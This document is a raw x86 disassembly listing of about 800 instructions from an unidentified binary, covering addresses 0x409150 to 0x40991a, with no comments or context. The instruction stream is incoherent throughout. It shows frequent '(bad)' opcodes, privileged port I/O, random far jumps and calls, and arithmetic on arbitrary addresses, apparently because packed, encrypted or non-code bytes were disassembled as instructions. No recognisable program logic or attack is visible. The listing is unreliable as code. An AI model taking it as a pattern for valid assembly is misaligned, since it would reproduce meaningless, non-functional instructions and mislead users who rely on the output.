  409150:	retf   0xa305
  409153:	jno    0x4091ba
  409155:	loope  0x409146
  409157:	cdq    
  409158:	inc    eax
  409159:	push   es
  40915a:	sub    ebx,eax
  40915c:	xchg   BYTE PTR [ecx],dh
  40915e:	inc    edx
  40915f:	dec    edx
  409160:	adc    eax,0x8043e125
  409165:	jne    0x4091d3
  409167:	or     DWORD PTR [esi+0x4a376231],eax
  40916d:	shl    BYTE PTR [edx-0x152c8dee],cl
  409173:	rol    DWORD PTR [ecx],0x78
  409176:	mov    esp,0x92fd309b
  40917b:	push   ebp
  40917c:	neg    DWORD PTR [eax+0x3f]
  40917f:	fnstsw WORD PTR ds:0x2f63d6b0
  409185:	pop    ebp
  409186:	lock inc eax
  409188:	jbe    0x40911f
  40918a:	sbb    eax,0xeebe3d2f
  40918f:	add    DWORD PTR [ecx-0x104d2f4d],eax
  409195:	dec    DWORD PTR [eax]
  409197:	lea    esi,[esi-0x5b]
  40919a:	xchg   esp,eax
  40919b:	or     ch,BYTE PTR [ecx-0x75a5493b]
  4091a1:	ja     0x4091f5
  4091a3:	jl     0x4091e6
  4091a5:	lahf   
  4091a6:	sub    edi,eax
  4091a8:	cwde   
  4091a9:	cmp    al,0x80
  4091ab:	scas   al,BYTE PTR es:[edi]
  4091ac:	add    al,0x9a
  4091ae:	xchg   edi,eax
  4091af:	sub    esp,DWORD PTR [ebx-0x16]
  4091b2:	add    DWORD PTR [ebx-0x6a],esp
  4091b5:	push   esp
  4091b6:	push   ss
  4091b7:	retf   
  4091b8:	ins    BYTE PTR es:[edi],dx
  4091b9:	mov    eax,ds:0xe4b6fee
  4091be:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  4091c0:	jl     0x4091c9
  4091c2:	push   ds
  4091c3:	in     al,dx
  4091c4:	push   0x543b5d1c
  4091c9:	outs   dx,BYTE PTR ds:[esi]
  4091ca:	add    BYTE PTR [eax-0x49bf25ad],bl
  4091d0:	cwde   
  4091d1:	fist   DWORD PTR [esi+0x5c]
  4091d4:	div    BYTE PTR [ebx]
  4091d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4091d7:	mov    ds:0x308b3d67,eax
  4091dc:	add    eax,0xffffffe3
  4091df:	outs   dx,DWORD PTR ds:[esi]
  4091e0:	mov    eax,ds:0xc3732191
  4091e5:	jb     0x4091af
  4091e7:	inc    esp
  4091e8:	push   0x242916b9
  4091ed:	loop   0x4091b6
  4091ef:	stos   BYTE PTR es:[edi],al
  4091f0:	mov    ds:0xe67c7511,al
  4091f5:	out    dx,al
  4091f6:	jmp    0x409260
  4091f8:	enterw 0x7baa,0x7c
  4091fd:	shr    ch,1
  4091ff:	shl    DWORD PTR [ebp+0x56955753],cl
  409205:	pop    ss
  409206:	clc    
  409207:	push   ss
  409208:	mov    cl,0xc2
  40920a:	(bad)  
  40920b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40920c:	rol    DWORD PTR [eax+0x5789fb32],0x33
  409213:	xor    ecx,eax
  409215:	mov    ch,0x7f
  409217:	sbb    DWORD PTR [edi+0x75],ebp
  40921a:	ficom  DWORD PTR [eax+eax*1+0x41]
  40921e:	(bad)  
  40921f:	xor    cl,BYTE PTR [ebx+0x6d]
  409222:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409223:	adc    ebp,DWORD PTR [ecx+0x52]
  409226:	out    dx,al
  409227:	es add al,0x8a
  40922a:	mov    edi,0x14d2e758
  40922f:	xchg   ebp,eax
  409230:	and    eax,0x51f14150
  409235:	loopne 0x40926d
  409237:	inc    ebp
  409238:	sbb    bl,ah
  40923a:	std    
  40923b:	test   al,0xb
  40923d:	in     eax,0x45
  40923f:	arpl   WORD PTR [ebp+0x44],bp
  409242:	xor    eax,0x3874ed54
  409247:	test   eax,0x9e682bd5
  40924c:	jno    0x409246
  40924e:	sahf   
  40924f:	dec    ecx
  409250:	push   ecx
  409251:	imul   esi,esi,0x7b
  409254:	xchg   ebx,ebp
  409256:	test   BYTE PTR [edi],bl
  409258:	cmp    eax,0x3903b0d8
  40925d:	sbb    al,0xfa
  40925f:	jl     0x4091e8
  409261:	mov    bl,0xb8
  409263:	call   0xc19c3ecc
  409268:	pusha  
  409269:	mov    al,0x90
  40926b:	loopne 0x40929f
  40926d:	jmp    0x26fa:0x3de4ed34
  409274:	rcr    ebx,1
  409276:	in     eax,0x6
  409278:	push   ebx
  409279:	je     0x409253
  40927b:	mov    ebp,0xd8dddceb
  409280:	add    edx,DWORD PTR [edi]
  409282:	mov    cl,al
  409284:	into   
  409285:	ins    BYTE PTR es:[edi],dx
  409286:	sbb    al,0xc3
  409288:	xor    edi,DWORD PTR [edx-0x6d47e36]
  40928e:	pop    ebp
  40928f:	cs cs push esi
  409292:	out    dx,al
  409293:	aam    0x4c
  409295:	rcr    DWORD PTR [eax-0x5b],1
  409298:	sub    eax,0x5d8e2a68
  40929d:	mov    ecx,0xd95bf5f7
  4092a2:	shl    BYTE PTR [ecx],0xdb
  4092a5:	mov    ds:0x779f980,eax
  4092aa:	(bad)  
  4092ab:	in     al,dx
  4092ac:	retf   0x8b0a
  4092af:	bound  esi,QWORD PTR [ecx]
  4092b1:	xor    DWORD PTR [ecx],0xdf5efe3a
  4092b7:	and    BYTE PTR [ebx-0x75b0752c],bh
  4092bd:	mov    ch,0x67
  4092bf:	std    
  4092c0:	imul   edi,DWORD PTR [ebx+0x56],0x3a
  4092c4:	fisub  WORD PTR [ebp-0x64c7d8b4]
  4092ca:	mov    ebp,0xa288f11f
  4092cf:	jb     0x40928a
  4092d1:	mov    esi,DWORD PTR [edi]
  4092d3:	adc    DWORD PTR [edi-0x6a6785a],edx
  4092d9:	mov    ebx,0x9dd5a463
  4092de:	adc    ch,cl
  4092e0:	xchg   esi,eax
  4092e1:	sbb    BYTE PTR [edi],bl
  4092e3:	mov    es,edi
  4092e5:	mov    ebp,0xc3f5ff61
  4092ea:	xor    al,0x3
  4092ec:	sub    BYTE PTR [ebx+0x449146df],cl
  4092f2:	addr16 in al,0x25
  4092f5:	sbb    eax,0xae9ebdb5
  4092fa:	mov    edi,0x30e1949b
  4092ff:	add    BYTE PTR [edx+0x58d30ff],bl
  409305:	pusha  
  409306:	mov    dl,0x41
  409308:	add    bh,bh
  40930a:	xor    BYTE PTR [ebp+0x41b34405],cl
  409310:	add    bh,bh
  409312:	xor    BYTE PTR [edi-0x7cbcbc2d],al
  409318:	jmp    0x40931d
  40931a:	push   ebx
  40931b:	pop    eax
  40931c:	jmp    0x409669
  409321:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409322:	jnp    0x409329
  409324:	or     DWORD PTR [ecx+0x52b3b211],esp
  40932a:	lahf   
  40932b:	jo     0x4092ae
  40932d:	cmp    bh,BYTE PTR [ebp-0x1dd8cd9d]
  409333:	jo     0x4093a5
  409335:	and    BYTE PTR [ebp+0x70],bh
  409338:	jo     0x4093a9
  40933a:	lea    ebp,[edx]
  40933c:	mov    esp,DWORD PTR [eax]
  40933e:	cli    
  40933f:	shr    BYTE PTR [ebx],1
  409341:	dec    esi
  409342:	stc    
  409343:	fbld   TBYTE PTR [edi+0x65]
  409346:	mov    cs,WORD PTR [edx]
  409348:	stos   DWORD PTR es:[edi],eax
  409349:	cmp    BYTE PTR ds:0xf4f92a9f,0x13
  409350:	in     al,0x84
  409352:	cmp    DWORD PTR [edi-0x6d],0x871975cd
  409359:	or     al,0x90
  40935b:	jae    0x409361
  40935d:	scas   al,BYTE PTR es:[edi]
  40935e:	add    eax,0x6ce35e76
  409363:	mov    edx,0xd6ab721d
  409368:	push   cs
  409369:	call   0x3648d31
  40936e:	enter  0xd2a,0x52
  409372:	repz clc 
  409374:	ins    BYTE PTR es:[edi],dx
  409375:	cwde   
  409376:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409377:	mov    dh,BYTE PTR [esi+0x6b]
  40937a:	sbb    eax,0xfc72d4e
  40937f:	(bad)  
  409380:	cmp    BYTE PTR [edi+0x21dae06f],al
  409386:	pop    ebp
  409387:	xchg   DWORD PTR ds:0xbc30f7c9,ebp
  40938d:	push   0xffffff94
  40938f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409390:	out    0x56,eax
  409392:	int    0x7d
  409394:	hlt    
  409395:	adc    BYTE PTR [eax-0x37],al
  409398:	sbb    bl,BYTE PTR [edx+0x22a16fcf]
  40939e:	sub    al,0xb0
  4093a0:	sub    al,0xc
  4093a2:	icebp  
  4093a3:	sub    al,0xea
  4093a5:	and    al,0x72
  4093a7:	pop    esp
  4093a8:	loope  0x4093f4
  4093aa:	outs   dx,DWORD PTR ds:[esi]
  4093ab:	jbe    0x4093e3
  4093ad:	(bad)  
  4093ae:	and    dh,BYTE PTR [eax]
  4093b0:	scas   eax,DWORD PTR es:[edi]
  4093b1:	out    dx,eax
  4093b2:	stos   BYTE PTR es:[edi],al
  4093b3:	sbb    al,0x19
  4093b5:	dec    ebp
  4093b6:	ins    BYTE PTR es:[edi],dx
  4093b7:	jb     0x4093b7
  4093b9:	stos   DWORD PTR es:[edi],eax
  4093ba:	sub    bl,BYTE PTR [ebx+0x53]
  4093bd:	in     eax,0xf4
  4093bf:	mov    dh,0x79
  4093c1:	push   esp
  4093c2:	pop    edi
  4093c3:	or     eax,0x3ecad6a2
  4093c8:	add    eax,0x2a25d8ca
  4093cd:	retf   
  4093ce:	push   edi
  4093cf:	jp     0x40938a
  4093d1:	dec    esp
  4093d2:	outs   dx,DWORD PTR ds:[esi]
  4093d3:	dec    ecx
  4093d4:	test   BYTE PTR [ebx],ch
  4093d6:	mov    dh,0xe1
  4093d8:	mov    DWORD PTR [eax],edi
  4093da:	fistp  DWORD PTR [eax]
  4093dc:	aas    
  4093dd:	jmp    0x409377
  4093df:	mov    bl,0x51
  4093e1:	aam    0xf3
  4093e3:	das    
  4093e4:	repnz mov bh,0x4c
  4093e7:	lahf   
  4093e8:	mov    esp,DWORD PTR [ecx+0x5f985cc6]
  4093ee:	cmc    
  4093ef:	icebp  
  4093f0:	xor    BYTE PTR [ebp+0x72707693],bh
  4093f6:	xor    eax,0x5578ca77
  4093fb:	cli    
  4093fc:	mov    DWORD PTR [edx+0x1e0cf117],esp
  409402:	mov    al,ds:0xc88a69ab
  409407:	and    DWORD PTR [esi*8-0x5d70d30],esi
  40940e:	je     0x40942f
  409410:	out    dx,al
  409411:	leave  
  409412:	aaa    
  409413:	popf   
  409414:	dec    ebp
  409415:	clc    
  409416:	shr    DWORD PTR [ebx],0xb6
  409419:	mov    ds:0xeb69195d,al
  40941e:	cmp    DWORD PTR [esi+eiz*2-0x690cd41d],0x506f7eed
  409429:	mov    ecx,0xac261d7e
  40942e:	retf   0x848e
  409431:	or     al,BYTE PTR [ebx]
  409433:	pusha  
  409434:	mov    ch,0xd2
  409436:	adc    BYTE PTR [esi],cl
  409438:	and    BYTE PTR [ecx],0xa8
  40943b:	dec    eax
  40943c:	xchg   esi,eax
  40943d:	pop    edx
  40943e:	xchg   DWORD PTR [ebp+ecx*4-0x41024525],ecx
  409445:	test   BYTE PTR [edi+0x22],ch
  409448:	fild   DWORD PTR [esi-0x10c61c00]
  40944e:	pushf  
  40944f:	lahf   
  409450:	lock jae 0x4094c7
  409453:	outs   dx,DWORD PTR ds:[esi]
  409454:	jmp    0x3540:0x68cc8201
  40945b:	lods   al,BYTE PTR ds:[esi]
  40945c:	cld    
  40945d:	loop   0x40945b
  40945f:	hlt    
  409460:	adc    DWORD PTR [edi-0x6aa48b90],ecx
  409466:	mov    al,ds:0xecf0de80
  40946b:	pop    eax
  40946c:	gs sub eax,0x1b8d13f2
  409472:	gs adc al,0xec
  409475:	mov    ah,ah
  409477:	call   0x86c0:0xe0076eee
  40947e:	pushf  
  40947f:	stos   BYTE PTR es:[edi],al
  409480:	mov    ch,0x82
  409482:	mov    al,ds:0xc71231de
  409488:	pop    esp
  409489:	add    eax,0xc194d5e8
  40948e:	and    esi,DWORD PTR ds:0xbeb7b591
  409494:	jg     0x40947f
  409496:	cmp    BYTE PTR [esi-0xe],al
  409499:	iret   
  40949a:	dec    edi
  40949b:	and    al,0x78
  40949d:	int    0x7f
  40949f:	ret    
  4094a0:	sub    BYTE PTR [ebx-0x766e53a9],0xc5
  4094a7:	jo     0x409528
  4094a9:	std    
  4094aa:	push   0xffffffe6
  4094ac:	cmp    DWORD PTR [esi-0x32],esi
  4094af:	push   esi
  4094b0:	mov    eax,ds:0x7d6818e
  4094b5:	dec    eax
  4094b6:	inc    ebp
  4094b7:	jns    0x409498
  4094b9:	lods   al,BYTE PTR ds:[esi]
  4094ba:	ins    DWORD PTR es:[edi],dx
  4094bb:	mov    ds:0x57f3297b,eax
  4094c0:	leave  
  4094c1:	pop    ebx
  4094c2:	cmp    edi,ecx
  4094c4:	jmp    0x499def7d
  4094c9:	in     eax,dx
  4094ca:	xchg   ebp,eax
  4094cb:	xchg   esi,eax
  4094cc:	fst    DWORD PTR [ecx-0x6c62487]
  4094d2:	mov    ch,0xb8
  4094d4:	dec    esp
  4094d5:	adc    DWORD PTR [edi+0x2d836303],esp
  4094db:	out    0xdb,eax
  4094dd:	jle    0x4094a7
  4094df:	sbb    DWORD PTR [eax+0x3f],ebx
  4094e2:	jle    0x409519
  4094e4:	push   esi
  4094e5:	mov    ecx,0xdd9f38d2
  4094ea:	dec    edx
  4094eb:	mov    dl,bl
  4094ed:	shl    DWORD PTR [edi+0x415daa91],1
  4094f3:	stos   DWORD PTR es:[edi],eax
  4094f4:	outs   dx,DWORD PTR ds:[esi]
  4094f5:	xlat   BYTE PTR ds:[ebx]
  4094f6:	lock jge 0x40953f
  4094f9:	mov    al,ds:0xcfaca8e5
  4094fe:	inc    ecx
  4094ff:	int    0x5d
  409501:	rcr    DWORD PTR [esi],0x34
  409504:	add    BYTE PTR [edx-0x48],dh
  409507:	dec    DWORD PTR [ecx-0x39]
  40950a:	mov    eax,0xb595a2
  40950f:	add    DWORD PTR [ebp+0x26ad7cd5],edi
  409515:	dec    ebx
  409516:	imul   ebp,DWORD PTR [eax+0x50],0x65
  40951a:	mov    al,ds:0x288c57b5
  40951f:	and    esi,DWORD PTR [edx+0x6c911b61]
  409525:	je     0x4094b8
  409527:	lea    edx,[esi+0x5c]
  40952a:	adc    al,0xf
  40952c:	pop    ss
  40952d:	enter  0xe824,0x93
  409531:	cmp    esp,DWORD PTR [ebp+edx*8-0x62]
  409535:	inc    ecx
  409537:	mov    dh,0x1e
  409539:	leave  
  40953a:	mov    al,dh
  40953c:	out    0x91,al
  40953e:	inc    esi
  40953f:	cwde   
  409540:	ds jg  0x409577
  409543:	dec    ebx
  409544:	sub    esp,DWORD PTR [edi+0x7b477874]
  40954a:	lahf   
  40954b:	ss and al,0x7e
  40954e:	mov    ecx,0xfcef1dbf
  409553:	stc    
  409554:	fild   DWORD PTR [ebp+ebp*1-0x263b5630]
  40955b:	adc    BYTE PTR [eax-0xf43711c],ah
  409561:	adc    DWORD PTR [ecx-0x69feec22],edx
  409567:	int    0x3d
  409569:	adc    ah,BYTE PTR [eax+0x21]
  40956c:	ins    BYTE PTR es:[edi],dx
  40956d:	test   eax,0x6a8a7e95
  409572:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409573:	icebp  
  409574:	retf   
  409575:	dec    BYTE PTR [esi]
  409577:	pop    DWORD PTR [ebx+0x64ddaa3e]
  40957d:	sbb    BYTE PTR [eax-0x15],bl
  409580:	sub    DWORD PTR [ecx-0x29995efd],0xddcee18a
  40958a:	xchg   DWORD PTR [ecx+0x26],eax
  40958d:	jns    0x40953d
  40958f:	test   eax,0xcd040502
  409594:	test   BYTE PTR [ecx+0x2af424c4],al
  40959a:	arpl   WORD PTR [ebp-0x2fa8815d],ax
  4095a0:	repz daa 
  4095a2:	aas    
  4095a3:	or     al,0x9e
  4095a5:	add    dl,BYTE PTR [esi+0x5c380102]
  4095ab:	push   0x689f9aac
  4095b0:	pop    ds
  4095b1:	xlat   BYTE PTR ds:[ebx]
  4095b2:	and    dl,bl
  4095b4:	add    al,0xb2
  4095b6:	sub    eax,0xb20c5b8d
  4095bb:	adc    eax,0x854f87bc
  4095c0:	popf   
  4095c1:	out    dx,al
  4095c2:	add    al,BYTE PTR [esi+0x5115ca1f]
  4095c8:	pop    ecx
  4095c9:	jmp    0x6005:0x4edb1825
  4095d0:	and    eax,DWORD PTR [edx-0x268b7291]
  4095d6:	jg     0x4095f8
  4095d8:	fadd   st(5),st
  4095da:	mov    dl,0x14
  4095dc:	rcr    DWORD PTR [esi+esi*1-0x716441d],1
  4095e3:	mov    ds:0xb45c18b5,eax
  4095e8:	mov    ch,0x39
  4095ea:	and    ecx,edx
  4095ec:	stos   DWORD PTR es:[edi],eax
  4095ed:	mov    al,0xa4
  4095ef:	or     dh,BYTE PTR [eax-0x45]
  4095f2:	scas   al,BYTE PTR es:[edi]
  4095f3:	(bad)  
  4095f4:	(bad)  
  4095f5:	sub    ebx,edx
  4095f7:	stos   DWORD PTR es:[edi],eax
  4095f8:	xor    BYTE PTR [edx+0x1cd12398],bh
  4095fe:	mov    ds:0xcf0cace7,al
  409603:	xor    DWORD PTR [ebp-0x642f2d7b],ecx
  409609:	sar    DWORD PTR [edi],0x52
  40960c:	push   ecx
  40960d:	cmp    DWORD PTR [edx+0x17],ebx
  409610:	or     dl,BYTE PTR [ebp+0x28]
  409613:	mov    al,0x31
  409615:	jno    0x40965e
  409617:	(bad)  
  409618:	ds xchg esi,eax
  40961a:	cmp    ebp,DWORD PTR [ebx]
  40961c:	lods   eax,DWORD PTR ds:[esi]
  40961d:	bound  ebx,QWORD PTR [edi+eiz*2-0x7c7361d4]
  409624:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409625:	loope  0x40960b
  409627:	add    al,ah
  409629:	mov    bx,0x30fc
  40962d:	lds    edi,FWORD PTR [edi+0x3483cdfc]
  409633:	jl     0x40968e
  409635:	push   0xffffffd5
  409637:	int3   
  409638:	or     ebx,DWORD PTR [ecx-0x602183b7]
  40963e:	pop    ds
  40963f:	stos   DWORD PTR es:[edi],eax
  409640:	mov    bl,BYTE PTR [ebp+0x4b65d258]
  409646:	jae    0x4096a0
  409648:	jo     0x4095e7
  40964a:	cwde   
  40964b:	inc    ecx
  40964c:	mov    eax,es:0xfbcb8dfe
  409652:	push   esi
  409653:	mov    eax,0x434aea0d
  409658:	enter  0xb2d4,0xc7
  40965c:	test   eax,0x5861b854
  409661:	into   
  409662:	jae    0x4096d8
  409664:	aad    0xee
  409666:	cmp    esp,DWORD PTR [esi]
  409668:	sbb    edi,edi
  40966a:	push   eax
  40966b:	add    DWORD PTR [ebx+0xd8be045],ecx
  409671:	and    al,0xb2
  409673:	inc    ecx
  409674:	add    cl,ch
  409676:	dec    eax
  409677:	add    eax,DWORD PTR [eax]
  409679:	add    bh,ch
  40967b:	mov    ebx,0xd169d149
  409680:	ja     0x4096e3
  409682:	add    BYTE PTR [edi+0x44],bh
  409685:	xchg   esi,ecx
  409687:	loope  0x4096bc
  409689:	(bad)  
  40968a:	xlat   BYTE PTR ds:[ebx]
  40968b:	out    dx,eax
  40968c:	jo     0x4096fe
  40968e:	and    BYTE PTR [ebp+0x70],bh
  409691:	jo     0x4096ec
  409693:	mul    DWORD PTR [ecx]
  409695:	bound  ecx,QWORD PTR [ecx]
  409697:	xor    al,0xa8
  409699:	nop    DWORD PTR [eax-0x73304303]
  4096a0:	sbb    ah,cl
  4096a2:	lods   eax,DWORD PTR ds:[esi]
  4096a3:	lods   eax,DWORD PTR ds:[esi]
  4096a4:	pop    ebp
  4096a5:	dec    esp
  4096a6:	push   ss
  4096a7:	or     eax,esp
  4096a9:	inc    ecx
  4096aa:	add    esi,eax
  4096ac:	mov    DWORD PTR [ebp-0x36287eca],ebx
  4096b2:	cwde   
  4096b3:	into   
  4096b4:	(bad)  
  4096b5:	or     edi,DWORD PTR [esi-0x2d]
  4096b8:	mov    cl,0x86
  4096ba:	inc    edx
  4096bb:	mov    dl,0x83
  4096bd:	inc    ecx
  4096be:	xchg   esi,eax
  4096bf:	imul   ebx,DWORD PTR [ebx-0x49e46197],0xffffffbc
  4096c6:	add    DWORD PTR [edx+0x3c],ebx
  4096c9:	scas   eax,DWORD PTR es:[edi]
  4096ca:	js     0x409678
  4096cc:	test   DWORD PTR [ebp+0x62],edi
  4096cf:	pushf  
  4096d0:	mov    esp,0x8af7a31f
  4096d5:	stos   DWORD PTR es:[edi],eax
  4096d6:	or     al,0x7a
  4096d8:	pop    esp
  4096d9:	xor    al,0x43
  4096db:	je     0x4096c9
  4096dd:	fs jns 0x409692
  4096e0:	lds    ecx,FWORD PTR [esi-0x70]
  4096e3:	mov    ds:0x17cad710,al
  4096e8:	test   BYTE PTR [esi+0x7dd09414],dl
  4096ee:	mov    ss:0x1df62dd3,al
  4096f4:	mov    bl,0xa0
  4096f6:	iret   
  4096f7:	inc    esp
  4096f8:	adc    al,0xf8
  4096fa:	stos   BYTE PTR es:[edi],al
  4096fb:	out    0x2e,al
  4096fd:	dec    ecx
  4096fe:	sub    eax,0xf9b4bb8d
  409703:	fwait
  409704:	out    0x50,al
  409706:	js     0x4096c5
  409708:	es fs jae 0x4096fa
  40970c:	dec    ebx
  40970d:	pop    ebp
  40970e:	pusha  
  40970f:	ret    
  409710:	jne    0x409730
  409712:	ret    0x567e
  409715:	sahf   
  409716:	sbb    BYTE PTR [eax],0x0
  409719:	sahf   
  40971a:	pop    ebx
  40971b:	cmp    DWORD PTR [ebx],0x2d
  40971e:	xchg   edi,eax
  40971f:	xchg   ebp,eax
  409720:	xchg   bh,ah
  409722:	mov    ds,WORD PTR [ecx]
  409724:	fisub  DWORD PTR [esi]
  409726:	pop    es
  409727:	(bad)  [ecx-0x19]
  40972a:	and    BYTE PTR [ebp-0x5d],bh
  40972d:	dec    ecx
  40972e:	data16 clc 
  409730:	or     eax,0x8f6dd2d5
  409735:	and    DWORD PTR [ecx+0x35f208f1],ebp
  40973b:	sub    esp,edx
  40973d:	aad    0xf
  40973f:	rcr    BYTE PTR fs:[esi-0x3b],0x1d
  409744:	push   ebp
  409745:	scas   eax,DWORD PTR es:[edi]
  409746:	mov    bh,0x57
  409748:	sbb    eax,0x34976057
  40974d:	cmp    al,0xc9
  40974f:	sar    BYTE PTR [eax-0x74e565ad],1
  409755:	add    eax,0xd08fd810
  40975a:	xchg   ebx,eax
  40975b:	xor    ch,ch
  40975d:	lea    eax,[ebp+ebx*4+0x2d37443f]
  409764:	stos   DWORD PTR es:[edi],eax
  409765:	adc    DWORD PTR [ebp-0x41],eax
  409768:	mov    BYTE PTR [ebx-0x52f3e3f],dl
  40976e:	ins    DWORD PTR es:[edi],dx
  40976f:	cmp    al,0x99
  409771:	shl    esi,1
  409773:	xlat   BYTE PTR ds:[ebx]
  409774:	add    DWORD PTR [edx+ecx*2+0x40],0x8369d86f
  40977c:	dec    ebp
  40977d:	sbb    edx,ebx
  40977f:	xchg   ebx,eax
  409780:	call   0x66b2:0xcb2e1058
  409787:	repnz shl DWORD PTR [eax+eiz*8],cl
  40978b:	xchg   ecx,eax
  40978c:	inc    edx
  40978d:	push   ebx
  40978e:	(bad)  
  40978f:	jns    0x40975d
  409791:	adc    BYTE PTR [edi+0x6e4a6d13],0xf7
  409798:	int    0xfc
  40979a:	js     0x409754
  40979c:	and    DWORD PTR [ebx+0x51b68e5],edx
  4097a2:	retf   
  4097a3:	add    ah,dh
  4097a5:	xchg   ecx,eax
  4097a6:	ins    BYTE PTR es:[edi],dx
  4097a7:	(bad)  
  4097a8:	fucomip st,st(5)
  4097aa:	mov    bl,0x5f
  4097ac:	loopne 0x4097e3
  4097ae:	sbb    BYTE PTR [edx+edi*2],ch
  4097b1:	sub    DWORD PTR [edx+0x3c],ebp
  4097b4:	mov    cl,0x10
  4097b6:	fwait
  4097b7:	push   ecx
  4097b8:	and    edi,DWORD PTR [ebp+0x30]
  4097bb:	xchg   ebp,eax
  4097bc:	addr16 sbb al,0x45
  4097bf:	lods   eax,DWORD PTR ds:[esi]
  4097c0:	jo     0x4097d0
  4097c2:	neg    DWORD PTR [edx+0x76]
  4097c5:	ins    BYTE PTR es:[edi],dx
  4097c6:	out    0xda,al
  4097c8:	enter  0xfdca,0x5f
  4097cc:	ds mov ebp,0xc1407613
  4097d2:	imul   esi,DWORD PTR [ecx+0x38],0x7ac56eaa
  4097d9:	fidivr DWORD PTR [esp+ebx*8-0x37]
  4097dd:	pause  
  4097df:	fisttp QWORD PTR [ebx+0xf72ec18]
  4097e5:	jge    0x409853
  4097e7:	outs   dx,DWORD PTR ds:[esi]
  4097e8:	ins    BYTE PTR es:[edi],dx
  4097e9:	fild   DWORD PTR [eax+0x67]
  4097ec:	dec    ebp
  4097ed:	pushf  
  4097ee:	fdiv   QWORD PTR ss:[ebx-0x80]
  4097f2:	scas   eax,DWORD PTR es:[edi]
  4097f3:	in     al,dx
  4097f4:	xlat   BYTE PTR ds:[ebx]
  4097f5:	daa    
  4097f6:	pusha  
  4097f7:	or     al,dl
  4097f9:	ret    
  4097fa:	lahf   
  4097fb:	fldcw  WORD PTR [esi]
  4097fd:	xchg   esi,eax
  4097fe:	out    dx,al
  4097ff:	pop    ds
  409800:	lods   al,BYTE PTR ds:[esi]
  409801:	cld    
  409802:	aam    0xed
  409804:	fimul  DWORD PTR [eax]
  409806:	xor    al,0x24
  409808:	mov    al,0x3f
  40980a:	cmp    BYTE PTR [ebx-0x61bb04d0],ch
  409810:	inc    eax
  409811:	push   eax
  409812:	dec    ebp
  409813:	pop    esi
  409814:	add    BYTE PTR [esi],0x6e
  409817:	scas   al,BYTE PTR es:[edi]
  409818:	add    al,BYTE PTR [ebx]
  40981a:	inc    esp
  40981b:	jne    0x409846
  40981d:	sbb    eax,0xd49c7c1f
  409822:	ins    BYTE PTR es:[edi],dx
  409823:	cdq    
  409824:	mov    bh,0x7f
  409826:	or     eax,0x78e8a90
  40982b:	inc    ecx
  40982c:	sbb    al,0xd0
  40982e:	push   0x751ee8c3
  409833:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409834:	(bad)  
  409835:	xchg   ecx,eax
  409836:	outs   dx,BYTE PTR ds:[esi]
  409837:	push   ebp
  409838:	mov    esi,0xc4160721
  40983d:	sub    al,0xd0
  40983f:	mov    dh,0xe8
  409841:	rol    BYTE PTR [edx],0xac
  409844:	pop    edx
  409845:	pop    edx
  409846:	mov    ebx,0x44e8915b
  40984b:	jg     0x40980e
  40984d:	mov    dh,0x4
  40984f:	pop    ds
  409850:	push   ss
  409851:	pushf  
  409852:	inc    esp
  409853:	pop    ss
  409854:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409855:	push   ebp
  409856:	jmp    0x4097da
  409858:	pop    ebx
  409859:	jle    0x4098bb
  40985b:	mov    dh,0xca
  40985d:	jne    0x4098b0
  40985f:	sar    BYTE PTR [ecx],1
  409861:	fbstp  TBYTE PTR [edi-0x2bddeaac]
  409867:	inc    eax
  409868:	sub    DWORD PTR [ebx+0x28b46800],ebp
  40986e:	lods   eax,DWORD PTR ds:[esi]
  40986f:	xor    edx,DWORD PTR [edx+0x2d5e7e95]
  409875:	loop   0x4098ec
  409877:	(bad)  
  409878:	fidiv  DWORD PTR [edi+0x7]
  40987b:	xchg   edx,eax
  40987c:	lea    ecx,[eax-0x2d]
  40987f:	hlt    
  409880:	sub    ch,bl
  409882:	mov    ebx,0xd04fc041
  409888:	pop    edx
  409889:	and    dh,BYTE PTR ds:0x77a45241
  40988f:	push   ds
  409890:	(bad)  
  409891:	rcr    BYTE PTR [edx-0x12],1
  409894:	mov    ch,0x6e
  409896:	shl    DWORD PTR [eax],cl
  409898:	and    al,0x81
  40989a:	outs   dx,DWORD PTR ds:[esi]
  40989b:	(bad)  
  40989c:	sub    DWORD PTR [eax],eax
  40989e:	xchg   edi,eax
  40989f:	repz dec esi
  4098a1:	jmp    0x4e474f94
  4098a6:	sub    DWORD PTR [esp+ebx*8-0x20],eax
  4098aa:	repnz bound edx,QWORD PTR [esi]
  4098ad:	data16 adc BYTE PTR [eax+eax*1+0x4e],cl
  4098b2:	mov    ds:0xc44b33fe,eax
  4098b7:	mov    ecx,0xa0ae127f
  4098bc:	add    al,0x25
  4098be:	loopne 0x4098d3
  4098c0:	pcmpeqd mm7,QWORD PTR fs:[ebp-0x73de64dd]
  4098c8:	xor    bh,ah
  4098ca:	xchg   edi,eax
  4098cb:	inc    ecx
  4098cc:	adc    DWORD PTR [eax],ebx
  4098ce:	cwde   
  4098cf:	stc    
  4098d0:	call   0xdea6:0x29f52328
  4098d7:	in     eax,dx
  4098d8:	pop    ebp
  4098d9:	push   ds
  4098da:	push   0x42784134
  4098df:	test   DWORD PTR [esi],esp
  4098e1:	mov    esp,0x25e68ac2
  4098e6:	pop    esp
  4098e7:	mov    cl,0x42
  4098e9:	ins    BYTE PTR es:[edi],dx
  4098ea:	xchg   ebx,eax
  4098eb:	leave  
  4098ec:	and    BYTE PTR [ecx+0x21],dh
  4098ef:	dec    ebx
  4098f0:	js     0x409939
  4098f2:	jmp    0xdc9bd1ec
  4098f7:	pop    esi
  4098f9:	fdivr  DWORD PTR [ebp+esi*4+0x43]
  4098fd:	mov    cl,0xdf
  4098ff:	push   cs
  409900:	cmc    
  409901:	cmp    esp,DWORD PTR [eax]
  409903:	cmp    ebx,DWORD PTR [ebx]
  409905:	mov    al,ds:0x82836dc4
  40990a:	lea    esp,[esi-0x34]
  40990d:	fwait
  40990e:	push   ebp
  40990f:	fldcw  WORD PTR [ebx-0x7d37cac0]
  409915:	or     ch,BYTE PTR [eax]
  409917:	jl     0x4098c4
  409919:	hlt    
  40991a:	popf   
